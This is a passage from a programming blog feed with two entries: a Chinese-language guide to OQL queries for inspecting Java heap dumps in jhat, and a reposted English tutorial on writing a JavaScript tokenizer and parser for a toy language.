<li><p><code>select</code> 和 <code>where</code> 后跟进的都是 <code>js</code> 表达式作为子句。<br> 这么搞是为了方便，<code>js</code> 作为动态语言用起来算是比较爽的了，比如 <code>object.filed_name</code>, <code>arr[index]</code>，用个正则啊之类的。<br> 然后跟 <code>sql</code> 差不多，就是 <code>from</code> 里给个别名，然后 <code>select</code> 里用。通过这种方式把 <code>from</code> 里的 <code>id</code> 对应的 <code>object</code> 绑到 <code>js</code> 变量上。</p>
</li>
</ul>
<h2 id="整活"><a href="#整活" class="headerlink" title="整活"></a>整活</h2><ul>
<li><p>select all Strings of length 100 or more &#x2F;&#x2F; 查询超过 100 长度的字符串</p>
<p>  <code>select s from java.lang.String s where s.value.length &gt;= 100</code></p>
</li>
<li><p>select all int arrays of length 256 or more &#x2F;&#x2F; 查询超过 256 长度的数组</p>
<p>  <code>select a from [I a where a.length &gt;= 256</code></p>
</li>
<li><p>show content of Strings that match a regular expression &#x2F;&#x2F; 字符串对象匹配正则</p>
<p>  <code>select s.value.toString() from java.lang.String s where /java/.test(s.value.toString())</code></p>
</li>
<li><p>show path value of all File objects &#x2F;&#x2F; 是不是开始 get 爽点了？</p>
<p>  <code>select file.path.value.toString() from java.io.File file</code></p>
</li>
<li><p>show names of all ClassLoader classes &#x2F;&#x2F; 这个应该算是真正的唯一标识了吧</p>
<p>  <code>select classof(cl).name from instanceof java.lang.ClassLoader cl</code></p>
</li>
<li><p>show instances of the Class identified by given id string &#x2F;&#x2F; 这个 id 就是 jhat 的id(如下图), 或者后文中的objectId函数也可以拿到</p>
<p>  <code>select o from instanceof 0xd404b198 o</code></p>
</li>
</ul>
<p>Note that 0xd404b198 is id of a Class (in a session). This is found by looking at the id shown in that class’s page. </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/09/26/oql/jhat.png"
                      class="" title="jhat"
                >

<h2 id="OQL-内置-对象，函数"><a href="#OQL-内置-对象，函数" class="headerlink" title="OQL 内置 对象，函数"></a>OQL 内置 对象，函数</h2><h3 id="全局性的-heap-对象"><a href="#全局性的-heap-对象" class="headerlink" title="全局性的 heap 对象"></a>全局性的 heap 对象</h3><h4 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h4><ol>
<li><p>heap.forEachClass - 为每个Java类调用一个回调函数<br> <code>heap.forEachClass(callback)</code></p>
</li>
<li><p>heap.forEachObject - 为每个Java对象调用回调函数 <code>clazz</code> 就是选中的对象对应的类，<code>includeSubtypes</code> 就是指要不要包含子类<br> <code>heap.forEachObject(callback, [clazz = java.lang.Object], [includeSubtypes = true])</code></p>
</li>
</ol>
<p>上面俩基本就简单的循环，没找到啥好应用，差不多好点的就是用来做个<a class="link"   href="https://stackoverflow.com/a/48895782/7103214" >特殊计数啊之类的<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<hr>
<h4 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h4><ol>
<li><code>heap.findClass(className)</code> 根据 className 查出对应的 class 对象</li>
</ol>
<ul>
<li><p>对象有以下的属性</p>
<ul>
<li><p>name - 类的名称。</p>
</li>
<li><p>superclass - 超类的类对象（如果是java.lang.Object，则为null）。</p>
</li>
<li><p>statics - 类的静态字段的 <code>&lt;名称，值&gt;</code> 键值对集合。</p>
</li>
<li><p>fields - 字段对象的数组。field对象具有名称，签名属性。</p>
</li>
<li><p>loader - 加载此类的 <code>ClassLoader</code> 对象。</p>
</li>
<li><p>signers - 签署此类的签名者。</p>
</li>
<li><p>protectionDomain - 此类所属的保护域</p>
</li>
</ul>
</li>
<li><p>对象有以下的方法<br>  -isSubclassOf - 测试给定的类是否是此类的直接或间接子类。</p>
<ul>
<li><p>isSuperclassOf - 测试给定的Class是否是此类的直接或间接超类。</p>
</li>
<li><p>subclasses - 返回直接和间接子类的数组。</p>
</li>
<li><p>superclasses - 返回直接和间接超类的数组。</p>
</li>
</ul>
</li>
</ul>
<ol start="2">
<li><code>heap.findObject(stringIdOfObject)</code> – 找实例</li>
</ol>
<h4 id="集合操作"><a href="#集合操作" class="headerlink" title="集合操作"></a>集合操作</h4><ol>
<li><p>heap.classes – returns an enumeration of all Java classes</p>
</li>
<li><p>heap.objects – 这个 filter 参数指的是在结果集的基础上用 filter 表达式做层过滤</p>
</li>
</ol>
<ul>
<li><code>heap.objects(clazz, [includeSubtypes=true], [filter])</code></li>
</ul>
<ol start="3">
<li><p>heap.finalizables – 返回等待 <code>finalized</code> 对象的枚举.</p>
</li>
<li><p>heap.livepaths – 返回数组，数组里包含了存活的对象. 同时接一个次要参数，表明是否返回持有对象弱引用的。</p>
</li>
</ol>
<ul>
<li><code>heap.livepaths(id, [weakRef=false])</code>  </li>
<li>返回对象的每个数组元素都是一个数组，这个子数组包含了在这个 <strong>引用链</strong> 路径上的对象</li>
</ul>
<ol start="5">
<li>heap.roots – 返回根对象<ul>
<li>id 此根引用的对象的字符串id</li>
<li>type 描述类型的 Root (JNI Global, JNI Local, Java Static etc)</li>
<li>description Root的字符串描述</li>
<li>referrer - 负责此根或null的Thread Object或Class对象</li>
</ul>
</li>
</ol>
<h4 id="举两个例子"><a href="#举两个例子" class="headerlink" title="举两个例子"></a>举两个例子</h4><p>access static field ‘props’ of class java.lang.System &#x2F;&#x2F; 找出 System 类 static 字段 props 的相关信息</p>
<pre><code>select heap.findClass(&quot;java.lang.System&quot;).statics.props
</code></pre>
<p>get number of fields of java.lang.String class &#x2F;&#x2F; 找出 String 类的 字段信息</p>
<pre><code>select heap.findClass(&quot;java.lang.String&quot;).fields.length
</code></pre>
<p>find the object whose object id is given &#x2F;&#x2F; 楞找</p>
<pre><code>select heap.findObject(&quot;0xf3800b58&quot;)
</code></pre>
<p>select all classes that have name pattern java.net.*  &#x2F;&#x2F; 过滤，看到这感觉 <code>oql</code> 的 api 设计的不够简练，似乎有些冗余 api</p>
<pre><code>select filter(heap.classes(), &quot;/java.net./.test(it.name)&quot;)
</code></pre>
<h3 id="单个对象上的函数"><a href="#单个对象上的函数" class="headerlink" title="单个对象上的函数"></a>单个对象上的函数</h3><ol>
<li>allocTrace 如果给定的Java对象可用，则返回分配栈跟踪。 具体是返回 帧对象的数组。每个帧对象具有以下属性：</li>
</ol>
<ul>
<li>className - 其方法在 frame 中运行的Java类的名称。</li>
<li>methodName - 运行的Java方法的名称。</li>
<li>methodSignature - frame 中运行的Java方法的签名。</li>
<li>sourceFileName - frame 中运行的Java类的源文件的名称。</li>
<li>lineNumber - 方法中的源行号。</li>
</ul>
<ol start="2">
<li>classof 返回给定Java对象的Class对象。结果对象支持以下属性，和 heap.object 的那个差不多</li>
</ol>
<ul>
<li><p>属性</p>
<ul>
<li>name - 类的名称。</li>
<li>superclass - 超类的类对象（如果是java.lang.Object，则为null）。</li>
<li>statics  - 类的静态字段的名称，值对。</li>
<li>fields - 字段对象的数组。字段对象具有名称，签名属性。</li>
<li>loader - 加载此类的ClassLoader对象。</li>
<li>signers  - 签署此类的签名者。</li>
<li>protectionDomain - 此类所属的保护域。</li>
</ul>
</li>
<li><p>方法</p>
<ul>
<li>isSubclassOf - 测试给定的类是否是此类的直接或间接子类。</li>
<li>isSuperclassOf - 测试给定的Class是否是此类的直接或间接超类。</li>
<li>subclasses - 返回直接和间接子类的数组。</li>
<li>superclasses - 返回直接和间接超类的数组。</li>
</ul>
</li>
</ul>
<h4 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h4><ul>
<li><p>show class name of each Reference type object &#x2F;&#x2F; </p>
<p>  <code>select classof(o).name from instanceof java.lang.ref.Reference o</code></p>
</li>
<li><p>show all subclasses of java.io.InputStream &#x2F;&#x2F; inpustream 的子类</p>
<p>  <code>select heap.findClass(&quot;java.io.InputStream&quot;).subclasses()</code></p>
</li>
<li><p>show all superclasses of java.io.BufferedInputStream &#x2F;&#x2F; bufferedInputStream 的父类</p>
<p>  <code>select heap.findClass(&quot;java.io.BufferedInputStream&quot;).superclasses()</code></p>
</li>
</ul>
<h4 id="其他常用函数"><a href="#其他常用函数" class="headerlink" title="其他常用函数"></a>其他常用函数</h4><ol>
<li><p><code>forEachReferrer</code> 为给定Java对象的每个引用者调用一个回调函数。</p>
</li>
<li><p><code>identical</code> 返回两个给定的Java对象是否相同。</p>
<ul>
<li><code>select identical(heap.findClass(&quot;Foo&quot;).statics.bar, heap.findClass(&quot;AnotherClass&quot;).statics.bar)</code></li>
</ul>
</li>
<li><p><code>objectid</code> 返回给定Java对象的String id。此id可以传递给 heap.findObject，也可以用于比较对象以进行标识</p>
<ul>
<li><code>select objectid(o) from java.lang.Object o</code></li>
</ul>
</li>
<li><p><code>reachables</code> 返回从给定Java对象传递引用的Java对象数组。（可选）接受第二个参数，该参数是逗号分隔的字段名称，以从可达性计算中排除。字段以class_name.field_name模式编写。</p>
<ul>
<li><code>select reachables(u, &#39;java.net.URL.handler&#39;) from java.net.URL u</code> 打印每个java.net.URL中的所有可访问内容，但省略可通过指定字段访问的对象。</li>
</ul>
</li>
<li><p><code>referrers</code> 返回引用了给定Java对象的所有对象</p>
<ul>
<li><code>select u from java.net.URL u where count(referrers(u)) &gt; 2</code> 查询持有URL引用次数超过2的对象</li>
</ul>
</li>
<li><p>refers function, root function, sizeof function, toHtml function 这些听个名就了解大概了，不介绍了，感兴趣的话可以看文章开头的链接</p>
</li>
</ol>
<h3 id="多值筛选"><a href="#多值筛选" class="headerlink" title="多值筛选"></a>多值筛选</h3><p>展示每个线程的名称和线程信息</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#123; name: t.name? t.name.toString() : &quot;null&quot;, thread: t &#125; </span><br><span class="line">    from instanceof java.lang.Thread t</span><br></pre></td></tr></table></figure></div>

<h4 id="迭代操作方法"><a href="#迭代操作方法" class="headerlink" title="迭代操作方法"></a>迭代操作方法</h4><p>这些方法接受 array&#x2F;iterator&#x2F;enumeration 和 一个表达式，用来对 集合对象迭代应用这些表达式</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">concat(array1/enumeration1, array2/enumeration2)</span><br><span class="line">contains(array/enumeration, expression)</span><br><span class="line">count(array/enumeration, expression)</span><br><span class="line">filter(array/enumeration, expression)</span><br><span class="line">length(array/enumeration)</span><br><span class="line">map(array/enumeration, expression)</span><br><span class="line">max(array/enumeration, [expression])</span><br><span class="line">min(array/enumeration, [expression])</span><br><span class="line">sort(array/enumeration, [expression])</span><br><span class="line">sum(array/enumeration, [expression])</span><br><span class="line">toArray(array/enumeration)</span><br><span class="line">unique(array/enumeration, [expression])</span><br></pre></td></tr></table></figure></div>

<p>三个迭代时使用的内置变量</p>
<ul>
<li>it -&gt; currently visited element</li>
<li>index -&gt; index of the current element</li>
<li>array -&gt; array&#x2F;enumeration that is being iterated</li>
</ul>
<p>用 <code>contains</code> 举个例子： 选择所有被某类静态字段引用的 Properties 对象。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select p from java.util.Properties p</span><br><span class="line">where contains(referrers(p), &quot;classof(it).name == &#x27;java.lang.Class&#x27;&quot;)</span><br></pre></td></tr></table></figure></div>

<h3 id="用两个复杂的例子收个尾"><a href="#用两个复杂的例子收个尾" class="headerlink" title="用两个复杂的例子收个尾"></a>用两个复杂的例子收个尾</h3><h4 id="Print-histogram-of-each-class-loader-and-number-of-classes-loaded-by-it"><a href="#Print-histogram-of-each-class-loader-and-number-of-classes-loaded-by-it" class="headerlink" title="Print histogram of each class loader and number of classes loaded by it"></a>Print histogram of each class loader and number of classes loaded by it</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select map(sort(map(heap.objects(&#x27;java.lang.ClassLoader&#x27;), </span><br><span class="line">&#x27;&#123; loader: it, count: it.classes.elementCount &#125;&#x27;), &#x27;lhs.count &lt; rhs.count&#x27;),</span><br><span class="line">&#x27;toHtml(it) + &quot;&lt;br&gt;&quot;&#x27;)</span><br></pre></td></tr></table></figure></div>

<ol>
<li>java.lang.ClassLoader有一个名为classes的私有字段，类型为java.util.Vector。</li>
<li>Vector有一个名为 elementCount的私有字段，是矢量中元素的数量。</li>
<li>我们使用JavaScript对象标识符 和map函数选择多个值（loader，count）。</li>
<li>然后带有比较表达式的排序函数对结果按计数（即加载的类数）进行排序。</li>
</ol>
<h4 id="Printing-value-of-all-System-properties"><a href="#Printing-value-of-all-System-properties" class="headerlink" title="Printing value of all System properties"></a>Printing value of all System properties</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select map(filter(heap.findClass(&#x27;java.lang.System&#x27;).statics.props.table, &#x27;it != null&#x27;), </span><br><span class="line">        function (it) &#123;</span><br><span class="line">            var res = &quot;&quot;;</span><br><span class="line">            while (it != null) &#123;</span><br><span class="line">                res += it.key.value.toString() + &#x27;=&#x27; +</span><br><span class="line">                       it.value.value.toString() + &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">                it = it.next;</span><br><span class="line">            &#125;</span><br><span class="line">            return res;</span><br><span class="line">       &#125;);</span><br></pre></td></tr></table></figure></div>

<ol>
<li>java.lang.System具有类型为java.util.Properties的名称为’props’的静态字段。</li>
<li>java.util.Properties的字段为’table’，类型为java.util.Hashtable $ Entry（此字段继承自java.util.Hashtable）。这是hashtable桶数组。</li>
<li>java.util.Hashtable $ Entry包含’key’，’value’和’next’字段。每个条目指向同一哈希表桶中的下一个条目（或null）。</li>
<li>java.lang.String类具有char []类型的’value’字段。</li>
</ol>
<h4 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h4><p><code>OQL</code> 可能并不稳定–因为Java平台类的私有字段可能会在没有任何通知的情况下被修改&#x2F;删除! (实现细节)。<br>但是，在用户类上使用这种查询可能是安全的–因为用户对类有控制权。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>[Parser] Build: PL By:JS</title>
    <url>/2017/12/02/parser-build-pl-byjs/</url>
    <content><![CDATA[<h2 id="initial"><a href="#initial" class="headerlink" title="initial"></a>initial</h2><p>Origin: <a class="link"   href="http://lisperator.net/pltut/" >http://lisperator.net/pltut/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> This is a tutorial on how to implement a programming language. If you ever wrote an interpreter or a compiler, then there is probably nothing new for you here. But, if you’re using regexps to “parse” anything that looks like a programming language, then please read at least the section on parsing. Let’s write less buggy code! The ToC on the right is in “simple-to-advanced” order. I’d recommend you not to skip forward, unless you know the subject well. You can always refer back if you don’t understand something. Also, questions and feedback are very much appreciated! The target audience is the average JavaScript &#x2F; NodeJS programmer.</p>
<h3 id="What-are-we-going-to-learn"><a href="#What-are-we-going-to-learn" class="headerlink" title="What are we going to learn"></a>What are we going to learn</h3><ul>
<li>What is a parser, and how to write one.</li>
<li>How to write an interpreter.</li>
<li>Continuations, and why are they important.</li>
<li>Writing a compiler.</li>
<li>How to transform code to continuation-passing style.</li>
<li>A few basic optimization techniques.</li>
<li>Examples of what our λanguage brings new over plain JavaScript.</li>
</ul>
<h3 id="Description-of-the-language"><a href="#Description-of-the-language" class="headerlink" title="Description of the language"></a>Description of the language</h3><pre><code># this is a comment

println(&quot;Hello World!&quot;);

println(2 + 3 * 4);

# functions are introduced with `lambda` or `λ`
fib = lambda (n) if n &lt; 2 then n else fib(n - 1) + fib(n - 2);

println(fib(15));

print-range = λ(a, b)             # `λ` is synonym to `lambda`
                if a &lt;= b then &#123;  # `then` here is optional as you can see below
                  print(a);
                  if a + 1 &lt;= b &#123;
                    print(&quot;, &quot;);
                    print-range(a + 1, b);
                  &#125; else println(&quot;&quot;);        # newline
                &#125;;
print-range(1, 5);
</code></pre>
<p>Output</p>
<pre><code>Hello World!
14
610
1, 2, 3, 4, 5
</code></pre>
<p>The λanguage looks a bit like JavaScript, but it’s different. First, there are no statements, only expressions. An expression returns a value and can be used in place of any other expression. Semicolons are required to separate expressions in a “sequence”. The curly brackets, { and }, create such a sequence, and it’s itself an expression. Its value is what the last expression evaluates to. The following is a valid program:</p>
<pre><code>a = &#123;
  fib(10);  # has no side-effects, but it&#39;s computed anyway
  fib(15)   # the last semicolon can be missing
&#125;;
print(a); # prints 610
</code></pre>
<p>Functions are introduced with one of the keywords lambda or λ (they are synonyms). After the keyword there must be a (possibly empty) parenthesized list of variable names separated with commas, like in JavaScript — these are the argument names. The function body is a single expression, but it can be a sequence wrapped in {…}. There is no return statement (there are no statements) — the last expression evaluated in a function gives the value to return to its caller. There is no var. To introduce new variables, you can use what JavaScripters call “IIFE”. Use a lambda, declare variables as arguments. Variables have function scope, and functions are closures — like in JavaScript. Even if is itself an expression. In JavaScript you’d get that effect with the ternary operator:</p>
<pre><code>a = foo() ? bar() : baz();           // JavaScript
a = if foo() then bar() else baz();  # λanguage
</code></pre>
<p>The then keyword is optional when the branch starts with an open bracket ({), as you can see in print-range above. Otherwise it is required. The else keyword is required if the alternative branch is present. Again, then and else take as body a single expression, but you can {group} multiple expressions by using brackets and semicolons. When the else branch is missing and the condition is false, the result of the if expression is false. Speaking of which, false is a keyword which denotes the only falsy value in our λanguage:</p>
<pre><code>if foo() then print(&quot;OK&quot;);
</code></pre>
<p>will print “OK” if and only if the result of foo() is NOT false. There’s also a true keyword for completion, but really everything which is not false (in terms of JavaScript’s &#x3D;&#x3D;&#x3D; operator) will be interpreted as true in conditionals (including the number 0 and the empty string “”). Also note above that there is no point to demand parentheses around an if’s condition. It’s no error if you add them, though, as an open paren starts an expression — but they’re just superfluous. A whole program is parsed as if it were embedded in curly brackets, therefore you need to place a semicolon after each expression. The last expression can be an exception.</p>
<hr>
<p>Well, that’s our tiny λanguage. It’s not necessarily a good one. The syntax looks cute, but it has its traps. There are a lot of missing features, like objects or arrays; we don’t concentrate on them because they’re not essential for our journey. If you understand all this material, you’ll be able to implement those easily. In the next section we’ll write a parser for this λanguage.</p>
<p>origin: <a class="link"   href="http://lisperator.net/pltut/" >http://lisperator.net/pltut/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<ul>
<li><p><a class="link"   href="https://github.com/ReZeroS/Parser/blob/master/Real_js/Input.js" >InputStream<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p><a class="link"   href="https://github.com/ReZeroS/Parser/blob/master/Real_js/Token.js" >TokenStream<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p><a class="link"   href="https://github.com/ReZeroS/Parser/blob/master/Real_js/Parse.js" >Parse<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
</ul>
<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p><code>var ast = parse(TokenStream(InputStream(code)));</code> Writing a parser is, depending on the language, a moderately complex task. <strong>In essence, it must transform a piece of code (which we inspect by looking at the characters) into an “abstract syntax tree” (AST).</strong> The AST is a structured in-memory representation of the program, and it’s “abstract” in the sense that it does not care exactly what characters is the source code made of, but it faithfully represents the semantics of it. For example, for the following program text:</p>
<pre><code>sum = lambda(a, b) &#123;
  a + b;
&#125;;
print(sum(1, 2));
</code></pre>
<p>our parser will generate the following AST, as a JavaScript object:</p>
<pre><code>&#123;
  type: &quot;prog&quot;,
  prog: [
    // first line:
    &#123;
      type: &quot;assign&quot;,
      operator: &quot;=&quot;,
      left: &#123; type: &quot;var&quot;, value: &quot;sum&quot; &#125;,
      right: &#123;
        type: &quot;lambda&quot;,
        vars: [ &quot;a&quot;, &quot;b&quot; ],
        body: &#123;
          // the body should be a &quot;prog&quot;, but because
          // it contains a single expression, our parser
          // reduces it to the expression itself.
          type: &quot;binary&quot;,
          operator: &quot;+&quot;,
          left: &#123; type: &quot;var&quot;, value: &quot;a&quot; &#125;,
          right: &#123; type: &quot;var&quot;, value: &quot;b&quot; &#125;
        &#125;
      &#125;
    &#125;,
    // second line:
    &#123;
      type: &quot;call&quot;,
      func: &#123; type: &quot;var&quot;, value: &quot;print&quot; &#125;,
      args: [&#123;
        type: &quot;call&quot;,
        func: &#123; type: &quot;var&quot;, value: &quot;sum&quot; &#125;,
        args: [ &#123; type: &quot;num&quot;, value: 1 &#125;,
                &#123; type: &quot;num&quot;, value: 2 &#125; ]
      &#125;]
    &#125;
  ]
&#125;
</code></pre>
<p>The main difficulty in writing a parser consists in a failure to properly <strong>organize the code</strong>. The parser should <strong>operate at <em>a higher level</em> than reading characters from a string</strong>. A few advices on how to keep complexity manageable:</p>
<ul>
<li><p>Write many functions and keep them small. In every function, do one thing and do it well.</p>
</li>
<li><p>Do not try to use regexps for parsing. They don’t work. Regexps can be helpful in the lexer though, but I suggest to limit them to very simple things.</p>
</li>
<li><p>Don’t attempt to guess. When unsure how to parse something, throw an error and make sure the message contains the error location (line&#x2F;column).</p>
</li>
</ul>
<p>To keep it simple I’ve split my code in three parts, which are further divided into many small functions:</p>
<ul>
<li>The character input stream</li>
<li>The token input stream (lexer)</li>
<li>The parser</li>
</ul>
<h2 id="Input-stream"><a href="#Input-stream" class="headerlink" title="Input stream"></a>Input stream</h2><p>We’re going to create a “stream object” which provides operations to read characters from a string. A stream object has 4 methods:</p>
<ul>
<li><p>peek() — returns the next value but without removing it from the stream.</p>
</li>
<li><p>next() — returns the next value and also discards it from the stream.</p>
</li>
<li><p>eof() — returns true if and only if there are no more values in the stream.</p>
</li>
<li><p>croak(msg) — does throw new Error(msg).</p>
</li>
</ul>
<p>The reason why I’m including the last one is that the stream can easily keep track of the current location (i.e. line&#x2F;column), which is important to display in the case of an error message. Feel free to add more methods here, depending on your needs. The character input stream deals with <strong>characters</strong>, so the values that next() &#x2F; peek() return are chars (well, since JS doesn’t have a char type, they’re strings containing one character). Here is the full code of this object, which I will call “InputStream”. It’s small enough and you should have no problem to understand it:</p>
<pre><code>function InputStream(input) &#123;
    var pos = 0, line = 1, col = 0;
    return &#123;
        next  : next,
        peek  : peek,
        eof   : eof,
        croak : croak,
    &#125;;
    function next() &#123;
        var ch = input.charAt(pos++);
        if (ch == &quot;\n&quot;) line++, col = 0; else col++;
        return ch;
    &#125;
    function peek() &#123;
        return input.charAt(pos);
    &#125;
    function eof() &#123;
        return peek() == &quot;&quot;;
    &#125;
    function croak(msg) &#123;
        throw new Error(msg + &quot; (&quot; + line + &quot;:&quot; + col + &quot;)&quot;);
    &#125;
&#125;
</code></pre>
<p>Note that it’s not a standard object (the kind you create with new). You just do var stream &#x3D; InputStream(string) to get a stream object. Next we’re going to write another abstraction on top of this object: the tokenizer.</p>
<h2 id="Token-Stream"><a href="#Token-Stream" class="headerlink" title="Token Stream"></a>Token Stream</h2><p>The tokenizer (also called “lexer”) operates on a character input stream and returns a stream object with the same interface, but the values returned by peek() &#x2F; next() will be tokens. A token is an object with two properties: type and value. Here are some examples with supported tokens:</p>
<pre><code>&#123; type: &quot;punc&quot;, value: &quot;(&quot; &#125;           // punctuation: parens, comma, semicolon etc.
&#123; type: &quot;num&quot;, value: 5 &#125;              // numbers
&#123; type: &quot;str&quot;, value: &quot;Hello World!&quot; &#125; // strings
&#123; type: &quot;kw&quot;, value: &quot;lambda&quot; &#125;        // keywords
&#123; type: &quot;var&quot;, value: &quot;a&quot; &#125;            // identifiers
&#123; type: &quot;op&quot;, value: &quot;!=&quot; &#125;            // operators
</code></pre>
<p><strong>Whitespace and comments are skipped over</strong>, no tokens are returned. In order to write the tokenizer we need to look more closely into the syntax of our language. The idea is to notice that depending on the current character (as returned by input.peek()) we can decide what kind of token to read:</p>
<ul>
<li>First off, skip over whitespace.</li>
<li>If input.eof() then return null.</li>
<li>If it’s a sharp sign (#), skip comment (retry after - the end of line).</li>
<li>If it’s a quote then read a string.</li>
<li>If it’s a digit, then we proceed to read a number.</li>
<li>If it’s a “letter”, then read an identifier or a keyword token.</li>
<li>If it’s one of the punctuation characters, return a punctuation token.</li>
<li>If it’s one of the operator characters, return an operator token.</li>
<li>If none of the above, error out with input.croak().</li>
</ul>
<hr>
<p>So here’s the “read_next” function — the “core” of the tokenizer — which implements the above:</p>
<pre><code>function read_next() &#123;
    read_while(is_whitespace);
    if (input.eof()) return null;
    var ch = input.peek();
    if (ch == &quot;#&quot;) &#123;
        skip_comment();
        return read_next();
    &#125;
    if (ch == &#39;&quot;&#39;) return read_string();
    if (is_digit(ch)) return read_number();
    if (is_id_start(ch)) return read_ident();
    if (is_punc(ch)) return &#123;
        type  : &quot;punc&quot;,
        value : input.next()
    &#125;;
    if (is_op_char(ch)) return &#123;
        type  : &quot;op&quot;,
        value : read_while(is_op_char)
    &#125;;
    input.croak(&quot;Can&#39;t handle character: &quot; + ch);
&#125;
</code></pre>
<p>This is a “dispatcher” function and it’s what next() will call in order to <strong>fetch the next token</strong>. Note it uses many utilities that are focused on particular token types, like <code>read_string()</code>, <code>read_number()</code> etc. There’s no point to complicate the dispatcher with code from those functions, even if we never call them elsewhere. Another thing to notice is that we don’t consume all the input stream in one step. Each time the parser will call for next token, we read one token. In case of a parse error we don’t even reach the end of the stream.</p>
<hr>
<p><code>read_ident()</code> will read characters as long as they are allowed as part of an identifier <code>(is_id)</code>. <strong>Identifiers must start with a letter, or λ or _</strong>, and can contain further such characters, or digits, or one of the following: <code>?!-&lt;&gt;=</code>. Therefore, foo-bar will not be read as three tokens but as a single identifier (a “var” token). The reason for this rule is that I’d like to be able to define functions named is-pair? or string&gt;&#x3D; (sorry, it’s the Lisper in me).</p>
<hr>
<p>Also, the read_ident() function will check the identifier against the list of known keywords, and if it’s there it will return a “kw” token, instead of a “var” one. I think the code pretty much speaks for itself now, so here is the complete tokenizer for our language. Couple of small other notes below.</p>
<pre><code>function TokenStream(input) &#123;
    var current = null;
    var keywords = &quot; if then else lambda λ true false &quot;;
    return &#123;
        next  : next,
        peek  : peek,
        eof   : eof,
        croak : input.croak
    &#125;;
    function is_keyword(x) &#123;
        return keywords.indexOf(&quot; &quot; + x + &quot; &quot;) &gt;= 0;
    &#125;
    function is_digit(ch) &#123;
        return /[0-9]/i.test(ch);
    &#125;
    function is_id_start(ch) &#123;
        return /[a-zλ_]/i.test(ch);
    &#125;
    function is_id(ch) &#123;
        return is_id_start(ch) || &quot;?!-&lt;&gt;=0123456789&quot;.indexOf(ch) &gt;= 0;
    &#125;
    function is_op_char(ch) &#123;
        return &quot;+-*/%=&amp;|&lt;&gt;!&quot;.indexOf(ch) &gt;= 0;
    &#125;
    function is_punc(ch) &#123;
        return &quot;,;()&#123;&#125;[]&quot;.indexOf(ch) &gt;= 0;
    &#125;
    function is_whitespace(ch) &#123;
        return &quot; \t\n&quot;.indexOf(ch) &gt;= 0;
    &#125;
    function read_while(predicate) &#123;
        var str = &quot;&quot;;
        while (!input.eof() &amp;&amp; predicate(input.peek()))
            str += input.next();
        return str;
    &#125;
    function read_number() &#123;
        var has_dot = false;
        var number = read_while(function(ch)&#123;
            if (ch == &quot;.&quot;) &#123;
                if (has_dot) return false;
                has_dot = true;
                return true;
            &#125;
            return is_digit(ch);
        &#125;);
        return &#123; type: &quot;num&quot;, value: parseFloat(number) &#125;;
    &#125;
    function read_ident() &#123;
        var id = read_while(is_id);
        return &#123;
            type  : is_keyword(id) ? &quot;kw&quot; : &quot;var&quot;,
            value : id
        &#125;;
    &#125;
    function read_escaped(end) &#123;
        var escaped = false, str = &quot;&quot;;
        input.next();
        while (!input.eof()) &#123;
            var ch = input.next();
            if (escaped) &#123;
                str += ch;
                escaped = false;
            &#125; else if (ch == &quot;\\&quot;) &#123;
                escaped = true;
            &#125; else if (ch == end) &#123;
                break;
            &#125; else &#123;
                str += ch;
            &#125;
        &#125;
        return str;
    &#125;
    function read_string() &#123;
        return &#123; type: &quot;str&quot;, value: read_escaped(&#39;&quot;&#39;) &#125;;
    &#125;
    function skip_comment() &#123;
        read_while(function(ch)&#123; return ch != &quot;\n&quot; &#125;);
        input.next();
    &#125;
    function read_next() &#123;
        read_while(is_whitespace);
        if (input.eof()) return null;
        var ch = input.peek();
        if (ch == &quot;#&quot;) &#123;
            skip_comment();
            return read_next();
        &#125;
        if (ch == &#39;&quot;&#39;) return read_string();
        if (is_digit(ch)) return read_number();
        if (is_id_start(ch)) return read_ident();
        if (is_punc(ch)) return &#123;
            type  : &quot;punc&quot;,
            value : input.next()
        &#125;;
        if (is_op_char(ch)) return &#123;
            type  : &quot;op&quot;,
            value : read_while(is_op_char)
        &#125;;
        input.croak(&quot;Can&#39;t handle character: &quot; + ch);
    &#125;
    function peek() &#123;
        return current || (current = read_next());
    &#125;
    function next() &#123;
        var tok = current;
        current = null;
        return tok || read_next();
    &#125;
    function eof() &#123;
        return peek() == null;
    &#125;
&#125;
</code></pre>
<ul>
<li><p>The next() function doesn’t always call <code>read_next()</code>, because it might have been peeked before (in which case <code>read_next()</code> was already called and the stream advanced). Therefore we need a current variable which keeps track of the current token.</p>
</li>
<li><p>We only support decimal numbers with the usual notation (no 1E5 stuff, no hex, no octal). But if we ever need more, the changes go only in <code>read_number()</code> and are pretty easy to do.</p>
</li>
<li><p>Unlike JavaScript, the only characters that cannot appear unquoted in a string are the quote character itself and the backslash. You need to backslash them. Otherwise strings can contain hard newlines, tabs, and whatnot. We don’t interpret the usual escapes like \n, \t etc. though again, the changes would be pretty trivial (in “read_string”).</p>
</li>
</ul>
